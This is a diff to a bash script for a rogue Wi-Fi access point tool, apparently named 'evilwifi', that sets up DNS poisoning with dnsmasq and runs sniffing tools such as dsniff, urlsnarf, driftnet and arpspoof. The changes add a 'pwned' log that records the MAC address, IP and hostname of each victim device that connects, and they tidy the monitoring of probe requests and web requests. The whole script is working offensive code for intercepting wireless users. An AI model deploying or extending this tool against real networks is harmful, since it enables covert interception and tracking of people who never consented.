@@ -74,6 +74,7 @@ mkdir $sessionfolder/pids;
 mkdir $sessionfolder/pcaps;
 mkdir $sessionfolder/config;
 LOG=$sessionfolder/logs/evilwifi.log;
+touch $sessionfolder/logs/pwned.log;
 touch $sessionfolder/logs/dnsmasq.log;
 touch $sessionfolder/logs/hostapd.log;
 touch $sessionfolder/logs/evilwifi.log;
@@ -243,7 +244,7 @@ exit 0; fi
 echo "| [$OK] SCRIPT REVISION: $REVISION"
 if [ -f $settings ]; then
 echo "| [$OK] Config File Found!"; 
-echo "| Loading Settings From $settings"
+echo "| [ >> ] Loading Settings From $settings"
 LOADCONF=0; else LOADCONF=0; fi
 if [ "$mydistro" = "BackTrack" ]; then echo "| [$OK] $mydistro Version $myversion Release $myrelease"; fi
 if [ "$mydistro" = "Kali" ]; then echo "| [$OK] $mydistro Release $myrelease"; fi
@@ -252,9 +253,9 @@ if [ "$INTERNET" = "FALSE" ]; then echo "| [$FAIL] No Internet Connection :-("; 
 if [ "$INTERNET" = "TRUE" ]; then echo "| [$OK] We Have Internet :-)"; dnscheck; fi
 if [ "$ICMPBLOCK" = "TRUE" ]; then echo "| [$WARN] Outbound ICMP Ping Is Blocked WAN SIDE ($WANIP)"; fi
 if [ "$DNS" = "FALSE" ]; then echo "| [$FAIL] DNS Error Cant Update Check"; fi
-echo "| Removing Conflicting Installed Packages!";
+echo "| [ >> ] Removing Conflicting Installed Packages!";
 dpkg -P --force-depends hostapd 2>/dev/null
-echo "| Checking For Missing Packages!";
+echo "| [ >> ] Checking For Missing Packages!";
 critarray=( aircrack-ng iptables dnsmasq xterm python macchanger wget perl brctl )
 for depend in ${critarray[@]}; do
 type -P $depend &>/dev/null || { echo "| [$CRIT] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
@@ -263,7 +264,7 @@ warnarray=( airdrop-ng arpspoof dpkg driftnet dsniff dhcpd3 dhcpd ettercap hosta
 for depend in ${warnarray[@]}; do
 type -P $depend &>/dev/null || { echo "| [$WARN] $depend"; echo "$depend" >> $sessionfolder/logs/missing.log; };
 done
-echo "| Missing Package List Saved To $sessionfolder/logs/missing.log";
+echo "| [ >> ] Saved To $sessionfolder/logs/missing.log";
 }
 function uninstalldeps(){
 echo "[>] REMOVING AIRCRACK-NG!";
@@ -378,9 +379,9 @@ kill `cat /var/run/dhcpd/$TAPIFACE.pid 2>$LOG` &>/dev/null;
 fi
 killall -9 airodump-ng aireplay-ng mdk3 driftnet urlsnarf dsniff &>/dev/null
 fw_stop
-echo "nameserver 8.8.8.8" > /etc/resolv.conf
 }
 function cleanup(){
+echo "nameserver 8.8.8.8" > /etc/resolv.conf
 echo > $dhcpconf
 rm -rf $lockfile
 # service network-manager restart
@@ -890,6 +891,7 @@ echo "* DNSMASQ DNS POISON!!! *"
 TERMTITLE="DNSMASQ-POISON"
 TERMCMD="dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
 STARTTERM
+tail -F $sessionfolder/logs/dnsmasq.log | awk '/DHCPACK/ && /'$BRLANIFACE'/ {printf ("TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n"), $3, $8, $7, $9; fflush(stdout)}' >> $sessionfolder/logs/pwned.log &
 }
 function startdnsmasqresolv(){
 echo "dhcp-option=wirelesslan,6,8.8.8.8,$TAPIP" >> $dnsmasqconf
@@ -897,6 +899,7 @@ echo "* DNSMASQ With Internet *"
 TERMTITLE="DNSMASQ-INTERNET"
 TERMCMD="dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
 STARTTERM
+tail -F $sessionfolder/logs/dnsmasq.log | awk '/DHCPACK/ && /'$BRLANIFACE'/ {printf ("TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n"), $3, $8, $7, $9; fflush(stdout)}' >> $sessionfolder/logs/pwned.log &
 }
 function dhcpdserver(){
 TERMTITLE="DHCP SERVER"
@@ -946,14 +949,14 @@ function taillogshostapd(){
 # for (i=9; i<=NF; i++)
 echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
 #echo "cur_time=$(awk '// {print $4}' < <(date))" >> $folder/probe.sh
-echo "awk '/Probe/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", datestr, \$5, \$8, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/hostapd.log)" >> $folder/probe.sh
+echo "awk '/Probe/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", datestr, \$5, \$8, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -F $sessionfolder/logs/hostapd.log)" >> $folder/probe.sh
 echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
-echo "awk '/AP-STA-CONNECTED/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: \n\", datestr, \$3)}' < <(tail -f $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
-echo "awk '/DHCPACK/ && /$BRLANIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f $sessionfolder/logs/dnsmasq.log)" >> $folder/pwned.sh
-echo "awk '/AP-STA-DISCONNECTED/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: DISCONNECTED  | IP: 000.000.000.000 | ESSID: \n\", datestr, \$3)}' < <(tail -f $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
+echo "awk '/AP-STA-CONNECTED/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: \n\", datestr, \$3)}' < <(tail -F $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
+echo "tail -F $sessionfolder/logs/pwned.log" >> $folder/pwned.sh
+echo "awk '/AP-STA-DISCONNECTED/ {datecmd=\"date +%H:%M:%S\"; datecmd | getline datestr; close(datecmd); printf(\"TIME: %s | MAC: %s | TYPE: DISCONNECTED  | IP: 000.000.000.000 | ESSID: \n\", datestr, \$3)}' < <(tail -F $sessionfolder/logs/hostapd.log) &" >> $folder/pwned.sh
 echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
-#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
-echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/logs/access.log)" >> $folder/web.sh
+#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -F $folder/access.log)" >> $folder/web.sh
+echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -F $sessionfolder/logs/access.log)" >> $folder/web.sh
 chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
@@ -966,22 +969,22 @@ STARTTERM
 TERMTITLE="PWNED"
 TERMCMD="/bin/bash $folder/pwned.sh"
 STARTTERM
-#VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
+#VICTIMMAC=awk '{printf("$2")}' < <(`tail -F dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
 #$TERM -e \
-#"tail -f $sessionfolder/error.log"
+#"tail -F $sessionfolder/error.log"
 }
 function taillogsairbase(){
 # for (i=9; i<=NF; i++)
 echo "echo \$$ > $sessionfolder/pids/probe.pid" > $folder/probe.sh
-echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -f $sessionfolder/logs/airbaseng.log)" >> $folder/probe.sh
+echo "awk '/directed/ {printf(\"TIME: %s | MAC: %s | TYPE: PROBE REQUEST | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$7, \$9, \$10, \$11, \$12, \$13, \$14, \$15)}' < <(tail -F $sessionfolder/logs/airbaseng.log)" >> $folder/probe.sh
 echo "echo \$$ > $sessionfolder/pids/pwned.pid" > $folder/pwned.sh
-echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -f $sessionfolder/logs/airbaseng.log) &" >> $folder/pwned.sh
-echo "awk '/DHCPACK/ && /$BRLANIFACE/ {printf(\"TIME: %s | MAC: %s | TYPE: DHCP ACK [OK] | IP: %s | HOSTNAME: %s\n\", \$3, \$9, \$8, \$10)}' < <(tail -f $sessionfolder/logs/dnsmasq.log)" >> $folder/pwned.sh
+echo "awk '/associated/ {printf(\"TIME: %s | MAC: %s | TYPE: CONNECTEDTOAP | IP: 000.000.000.000 | ESSID: %s %s %s %s %s %s %s\n\", \$1, \$3, \$8, \$9, \$10, \$11, \$12, \$13, \$14)}' < <(tail -F $sessionfolder/logs/airbaseng.log) &" >> $folder/pwned.sh
+echo "tail -F $sessionfolder/logs/pwned.log" >> $folder/pwned.sh
 echo "echo \$$ > $sessionfolder/pids/web.pid" > $folder/web.sh
-#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $folder/access.log)" >> $folder/web.sh
-echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -f $sessionfolder/logs/access.log)" >> $folder/web.sh
+#echo "awk '/GET/ {printf(\"TIME: %s | TYPE: WEB HTTP REQU | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -F $folder/access.log)" >> $folder/web.sh
+echo "awk '/GET/ {printf(\"TIME: %s | IP: %s | %s: %s | %s %s %s\n\", substr(\$4,14), \$1, \$9, \$11, \$6, \$7, \$8)}' < <(tail -F $sessionfolder/logs/access.log)" >> $folder/web.sh
 chmod a+x $folder/probe.sh
 chmod a+x $folder/pwned.sh
 chmod a+x $folder/web.sh
@@ -994,11 +997,11 @@ STARTTERM
 TERMTITLE="PWNED"
 TERMCMD="/bin/bash $folder/pwned.sh"
 STARTTERM
-#VICTIMMAC=awk '{printf("$2")}' < <(`tail -f dnsmasq.leases`)
+#VICTIMMAC=awk '{printf("$2")}' < <(`tail -F dnsmasq.leases`)
 #VICTIMIP=
 #VICTHOST=$(awk '/$VICTIMMAC/ {printf("$4")}')
 #$TERM -e \
-#"tail -f $sessionfolder/error.log"
+#"tail -F $sessionfolder/error.log"
 }
 ##########################
 # INTERFACE PREP SECTION #
